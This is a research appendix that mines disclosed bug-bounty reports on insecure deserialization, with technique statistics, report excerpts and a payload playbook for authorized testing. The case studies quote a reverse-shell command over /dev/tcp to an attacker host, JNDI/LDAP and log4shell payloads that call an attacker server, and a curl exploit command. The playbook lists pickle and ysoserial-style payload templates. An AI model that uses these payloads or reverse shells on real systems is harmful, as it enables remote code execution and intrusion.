# Evidence appendix — Insecure Deserialization

Mined from all **69 valid disclosed reports** for this class (20 paid, 29% — payment is not validity).

## Technique frequency (all valid writeups)

| Item | Count |
|---|---:|
| deserialization / gadget chain | 34 |
| public source-code / repo review | 25 |
| internal service / port / container | 14 |
| file upload / filename / extension | 11 |
| JWT / token / base64 decode | 8 |
| cache / CDN / unkeyed header | 8 |
| admin / privileged-role context | 8 |
| Content-Type / body-format switch | 6 |
| error message / stack trace probing | 6 |
| third-party data / paste / breach reuse | 6 |
| encoding / double-encode / null byte | 6 |
| HTTP method / verb tampering | 6 |
| subdomain / DNS / cert-transparency recon | 5 |
| race / concurrency / timing | 5 |
| XML / SOAP / SAML / XXE | 5 |
| parser confusion / normalization | 4 |
| WAF / sanitizer / filter bypass | 4 |
| API docs / Swagger / introspection | 3 |
| git history / exposed .git | 3 |
| parameter pollution / duplicate keys | 3 |
| unauthenticated / removed-cookie test | 3 |
| header injection (Host / X-Forwarded / etc.) | 3 |
| two-account / cross-account replay | 2 |
| webhook / OAuth / SAML / integration abuse | 2 |
| OAST / DNS / HTTP callback proof | 2 |
| JS bundle / source-map inspection | 2 |
| second-order / stored / blind delivery | 2 |
|  HosT/absolute-URL reset poisoning | 1 |
| replay / modify a captured request | 1 |
| swap object ID / parameter value | 1 |
| template injection (SSTI) | 1 |

## Tools mentioned

| Item | Count |
|---|---:|
| source-code-review | 24 |
| curl | 12 |
| python | 7 |
| git | 4 |
| burp-collaborator | 2 |
| collaborator/oast | 2 |
| browser | 1 |
| burp | 1 |

## Bypass primitives

| Item | Count |
|---|---:|
| content-type | 9 |
| bypass | 3 |
| bypassing | 2 |
| type confusion | 1 |

## Impact language

| Item | Count |
|---|---:|
| rce | 29 |
| remote code execution | 28 |
| token | 23 |
| password | 12 |
| arbitrary code | 10 |
| admin | 8 |
| localhost | 7 |
| arbitrary file | 6 |
| privilege escalation | 3 |
| exfiltrate | 2 |
| account takeover | 1 |
| credential | 1 |

## Parameters observed

| Item | Count |
|---|---:|
| concept | 3 |
| mitigation | 3 |
| dashboard | 3 |
| keyid | 2 |
| settings | 2 |
| location | 2 |
| enable_xcom_pickling | 2 |
| context | 1 |
| res | 1 |
| publickey | 1 |
| data | 1 |
| xuw8gddtvu51x3nmfnmmxiq | 1 |
| files | 1 |
| manager | 1 |
| value | 1 |
| rowid | 1 |
| user.provider.url | 1 |
| usefirstpass | 1 |
| servicename | 1 |
| debug | 1 |
| group.provider.url | 1 |
| enable_xcom_deserialize_support | 1 |
| max-age | 1 |
| hsts | 1 |
| exit | 1 |
| chunk | 1 |

## Recurring approach patterns

- **3×** attached is a video detailing the poc generating the payload for generate the payload i used the tool ysoserial
  - e.g. **Attached is a video detailing the PoC.** **Generating the payload:** for generate the payload I used the tool ysoserial.
- **2×** sending the payload to a vulnerable server curl data binary payload k after sending the payload to the dod server the code was successfully executed and i received the dns query on my bind server as can be seen in the log record below
  - e.g. **Sending the payload to a vulnerable server:** `curl --data-binary`@payload`-k` After sending the payload to the DoD server, the code was successfully executed and I received the DNS query on my BIND server, as can be seen in the log record below.
- **1×** when parsing a gem posted to the api v1 gems endpoint the rubygems org application immediately calls gem package new body spec inside app models pusher rb
  - e.g. When parsing a gem POSTed to the `/api/v1/gems` endpoint, the rubygems.org application immediately calls `Gem::Package.new(body).spec` inside `app/models/pusher.rb`.
- **1×** however yaml load is called directly when parsing the gem s checksum file in gem package read checksums
  - e.g. However, `YAML.load` is called directly when parsing the gem's checksum file in `Gem::Package#read_checksums`.
- **1×** using classes accessible within the application i was able to turn this into a call to marshal load on attacker controlled data
  - e.g. Using classes accessible within the application, I was able to turn this into a call to `Marshal.load` on attacker-controlled data.
- **1×** from there i was able to use known marshal exploitation techniques to achieve code execution on the server i m omitting some details here for brevity so that i can submit this report right away
  - e.g. From there, I was able to use known Marshal exploitation techniques to achieve code execution on the server (I'm omitting some details here for brevity so that I can submit this report right away).
- **1×** in this case as far as i have seen it is used for notifications
  - e.g. In this case, as far as I have seen, it is used for notifications.
- **1×** as far as i have seen the deserializer is only used to render notifications in render notifications as seen here the render notifications function is then used on the notifications template page as seen here there is no other place where the deserializer is used as far as i have seen
  - e.g. As far as I have seen, the deserializer is only used to render notifications, in `render_notifications`, as seen [here]( The `render_notifications` function is then used on the notifications template page, as seen here: There is no other place where the deserializer is used, as far as I have seen.
- **1×** in addition to the config changes i have also modified the eth sendtransaction code to add extra rlp encoded bytes to the end of the transaction
  - e.g. In addition to the config changes, I have also modified the eth_sendTransaction code to add extra rlp-encoded bytes to the end of the transaction.
- **1×** i could have used the eth sendrawtransaction endpoint but i didn t want to go through the process of hand constructing the rlp encoded data impact the attacker can add arbitrary data into the blockchain without paying the requisite gas or undergoing any validation of the extra data
  - e.g. I could have used the eth_sendRawTransaction endpoint, but I didn't want to go through the process of hand-constructing the rlp-encoded data: ## Impact The attacker can add arbitrary data into the blockchain without paying the requisite gas or undergoing any validation of the extra data.
- **1×** i have not checked to see how much data can be appended but i assume its limited only by whatever overall block transaction message size constraints exist
  - e.g. I have not checked to see how much data can be appended, but I assume its limited only by whatever overall block/transaction/message size constraints exist.
- **1×** i ve tested with the earliest and latest supported rails version and and both are affected
  - e.g. I've tested with the earliest and latest supported rails version, 4.2.10 and 5.2.1 and both are affected.
- **1×** we found that insecure deserialization allowed certain java classes in the paypal android app to be accessed by a malicious app on the same device
  - e.g. We found that insecure deserialization allowed certain Java classes in the PayPal Android app to be accessed by a malicious app on the same device.
- **1×** i found a deserialization vulnerability in the ownbackup app this vulnerability allows to execute remote code in the server
  - e.g. I found a deserialization vulnerability in the [OwnBackup]( app, this vulnerability allows to execute remote code in the server.
- **1×** description we identified potential unsafe deserialization vulnerability on the endpoint
  - e.g. ##Description We identified potential unsafe deserialization vulnerability on the ` endpoint.
- **1×** hello i found an outdated version of telerik web ui v2016 at the following url this means that we can achieve full rce by chaining two different cves cve which allows us to upload arbitrary files on the server and cve which is a deserialization vulnerability
  - e.g. Hello, I found an outdated version of Telerik Web UI (v2016.2.607.40) at the following URL: This means that we can achieve full RCE by chaining two different CVEs: CVE-2017-11317, which allows us to upload arbitrary files on the server, and CVE-2019-18935, which is a deserialization vulnerability.
- **1×** first of all the only thing that i tried to prove that i had successfully achieved code execution was making the server sleep for seconds
  - e.g. First of all, the only thing that I tried to prove that I had successfully achieved code execution was making the server sleep for 10 seconds.
- **1×** things to note i had to edit the original exploit code provided in the aforementioned blog post because i noticed that when uploading the dll file the server added a tmp at the end of the file name
  - e.g. Things to note --------------------- I had to edit the original exploit code provided in the aforementioned blog post ( because I noticed that when uploading the .dll file the server added a .tmp at the end of the file name.
- **1×** i added tmp at the end of line and after that it worked just fine
  - e.g. I added `+ '.tmp'` at the end of line 95 and after that it worked just fine.
- **1×** from here on out i used the write up at for reference
  - e.g. From here on out I used the write-up at for reference.
- **1×** with a slight modification to the script in the bishopfox write up i was able to determine the software version the versions txt file i used has been attached to this report for ease of replication
  - e.g. With a slight modification to the script in the BishopFox write-up, I was able to determine the software version: The `versions.txt` file I used has been attached to this report for ease of replication.
- **1×** as shown in the results the version is vulnerable to cve and i was able to successfully upload the testfile txt
  - e.g. As shown in the results, the version is vulnerable to CVE-2017-11317 and I was able to successfully upload the `testfile.txt`.
- **1×** to chain gadgets i found nice gadgets to delete some files
  - e.g. - To chain gadgets, I found 3 nice gadgets to delete some files.
- **1×** i created it based on geminabox use evil sever impact of course there is a danger in specifying an untrusted source and in the possibility of a man in the middle attack
  - e.g. I created it based on [geminabox]( ### Use evil sever ## Impact Of course, there is a danger in specifying an untrusted `source` and in the possibility of a man-in-the-middle attack.

## Case studies (full excerpts)

### 1529790 — Kafka Connect RCE via connector SASL  JAAS JndiLoginModule configuration
Aiven Ltd · $5000 · critical · https://hackerone.com/reports/1529790

## Summary: When configuring the connector via the Aiven API or the Kafka Connect REST API, the attacker can set the `database.history.producer.sasl.jaas.config` connector property for the `io.debezium.connector.mysql.MySqlConnector` connector. This is likely true for other debezium connectors too. By setting the connector value to `"com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker_server" useFirstPass="true" serviceName="x" debug="true" group.provider.url="xxx";"`, the server will connect to the attacker's LDAP server and it deserializes the LDAP response, which the attacker can use to execute java deserialization gadget chains on the kafka connect server. ## Steps To Reproduce: ██████ 1. Login into my VPS: `ssh ███████`, password: `█████` 1. Execute `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1"` 1. Execute `nc -nlvp 4445` on another tab 1. Execute `python3 poc.py` on another table. This poc script launches the exploit against my Aiven kafka connect instance. 1. Reverse shell connection should now be established ## The gadget chain The exploit uses `System.setProperty` gadget chain in the scala standard library to enable unsafe deserialization of apache commons collections transformers (finding this gadget chain took way too much time...). This payload has been designed for the Scala 

### 3031518 — CVE-2025-24813: Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet
Internet Bug Bounty · $4323 · high · https://hackerone.com/reports/3031518

I am sw0rd1ight.I found an Apache Tomcat RCE vulnerability in tomcat 9.0.98. If all of the following were true, a malicious user was able to perform remote code execution: - writes enabled for the default servlet (disabled by default) - support for partial PUT (enabled by default) - application was using Tomcat's file based session persistence with the default storage location - application included a library that may be leveraged in a deserialization attack I reported this vulnerability through the official Apache Tomcat security email and received a fix along with a CVE number CVE-2025-24813. this is screenshot of email and ASF response email I submitted. {F4134453} {F4134456} {F4134458} {F4134462} {F4134464} {F4134466} ## Impact Execute system commands to obtain system permissions

### 3861550 — connect.8x8.com: Deserialization Vulnerability  in Automation Builder via Jint→Newtonsoft serializer coercion (TypeNameHandling)
8x8 · $3000 · critical · https://hackerone.com/reports/3861550

@kyotozzx reported a deserialization vulnerability in the 8x8 Connect Automation Builder's HTTP request step. The vulnerability occurred when server-side template evaluation exposed Newtonsoft JSON objects directly to the Jint JavaScript engine. By providing a specially crafted JSON response, an authenticated user could coerce Jint's overload resolution to construct a `JsonSerializer` with attacker-controlled `TypeNameHandling` settings, enabling deserialization of arbitrary .NET types including `System.Diagnostics.Process`. The issue was quickly addressed by projecting HTTP responses to plain JavaScript values (`System.Dynamic.ExpandoObject`) before template evaluation, removing all Newtonsoft object exposure from the template scope. We thank @kyotozzx for submitting this report to us.

### 274990 — Remote code execution on rubygems.org
RubyGems · $1500 · critical · https://hackerone.com/reports/274990

When parsing a gem POSTed to the `/api/v1/gems` endpoint, the rubygems.org application immediately calls `Gem::Package.new(body).spec` inside `app/models/pusher.rb`. The authors of the application correctly observed that parsing untrusted YAML is dangerous (since it can serialize more or less arbitrary objects), so they monkey-patched the spec parser to use `Psych.safe_load` set from `config/initializers/forbidden_yaml.rb`. However, `YAML.load` is called directly when parsing the gem's checksum file in `Gem::Package#read_checksums`. Using classes accessible within the application, I was able to turn this into a call to `Marshal.load` on attacker-controlled data. From there, I was able to use known Marshal exploitation techniques to achieve code execution on the server (I'm omitting some details here for brevity so that I can submit this report right away). A proof of concept, `poc.gem`, is attached. Run the exploit with the following command: `cat poc.gem | curl -H 'Content-Type: application/gzip' --data-binary @- -H 'Authorization: █████' I ran the attached PoC twice. It just does a `wget` to my server. Please let me know if I should clarify anything! Thanks for running this program.

### 1425474 — [CVE-2021-44228] nps.acronis.com is vulnerable to the recent log4shell 0-day
Acronis · $1000 · critical · https://hackerone.com/reports/1425474

## Summary The website at nps.acronis.com is vulnerable to CVE-2021-44228 ## Steps To Reproduce I used this [script]( to find this. It spins up an interact-sh server to receive the callback and send the payload in the query string and about 30 diffent headers. You can reproduce manually with curl and interact-sh/burp collaborator/a server you control. However, since the callback is proof of the vulnerability, the script makes it easier to identify. Let me know if you want me to tell you which specific header fires the payload and I will test them. 1. Construct the payload: `${jdni:ldap://nps.acronis.com.<your-server>/test}` 1. Inject the payload in the Request Headers (User Agent, X-Forwarded-For etc) or use the script from fullscan: `python3 log4j-scan.py -u ' 1. Observe the callback, proving the deserialization of untrusted data which leads to rce {F1544482} ## Recommendations Update log4j to the latest [version]( If updating to the latest version is not possible the vulnerability can be mitigated by removing the JndiLookup class from the class path. Additionally, the issue can be mitigated on Log4j versions >=2.10 by setting the system property log4j2.formatMsgNoLookups or the LOG4J_FORMAT_MSG_NO_LOOKUPS environment variable to true. ## Impact Remote Code Execution (rce)

### 396954 — Attacker can add arbitrary data to the blockchain without paying gas
Rootstock Labs · no bounty (valid finding) · critical · https://hackerone.com/reports/396954

**Summary:** Due to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data will not only pass through validation, but also be propagated throug the network and mined into a block. Since the block parser uses the same code for decoding transactions (as it should), the block will also be conidered valid. **Description:** The issue stems from the Transaction::rlpParse function: Once all the relevant data is pulled from the decoded RLP, there are no checks to ensure that we've reached the end of the data. Since the transaction is constructed using the raw encoded bytes, any future calls to getEncoded() will return the entire byte array, including the bad data at the end. Signature verification of the valid transaction will still pass because it uses getRawEncoded() to compute the signature, which ignores the extra data. ## Steps To Reproduce: On a remote server I start up a regtest node from a clean codebase. This will begin mining as a single-node network: On my local machine, I start another regtest node but I modify the config to a) talk to my remote node, and b) not mine. I don't mine on this node because I will be using it to manufacture beefy transactions and I want to make sure that other, clean nodes will accept/mine these transactions. In addition to the config changes, 

### 1842674 — SQL Injection + Insecure Deserialization leads to Remote Code Execution on https://krisp.ai
Krisp · no bounty (valid finding) · critical · https://hackerone.com/reports/1842674

[tenweb-speed-optimizer]( wordpress plugin by [10web.io]( prior to 2.12.22 version was vulnerable to **UNAUTHENTICATED** SQL injection (in `/wp-json/tenwebio/v2/compress-one`) which could be chained with insecure deserialization in the plugin to gain RCE. Vendor published the issue as an "authenticated" one (update: wordfence team corrected it !) - [here]( We would like to thank @mikemyers for reporting it responsibly to us.

## Field playbook (unedited)

### quick

- Look for serialized blobs: Java, PHP, Python pickle, .NET, Ruby Marshal, YAML.
- Decode cookies/params; identify magic bytes (rO0, a:, 8004, etc.).
- Test gadget chains in an authorized, controlled way.
- Check integrity/signature validation and key management.
- Look at queues, caches, and session stores.

### payloads

- Java -> `rO0AB...` + ysoserial gadget
- PHP -> `O:8:"stdClass":...`
- Python -> `cos\nsystem\n(S'id'\ntR.` pickle
- Ruby -> `\x04\b[` Marshal

### bypass

- Signed cookies with a weak/known key.
- Filter bypass via encoding or nested serialization.
- Use DNS/HTTP callbacks to confirm gadget execution.

### surface

- cookie
- session
- token
- state
- data
- job
- queue
- cache

### tools

- ysoserial
- phpggc
- marshalsec
- Burp
- interactsh

### chain

- Deserialization -> RCE.
- Deserialization -> auth bypass.

## Corpus search commands

```sh
python3 ~/.local/share/hackerone-reports/h1.py stats --class deserialization
python3 ~/.local/share/hackerone-reports/h1.py search "<feature or param>" --class deserialization --limit 10
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```
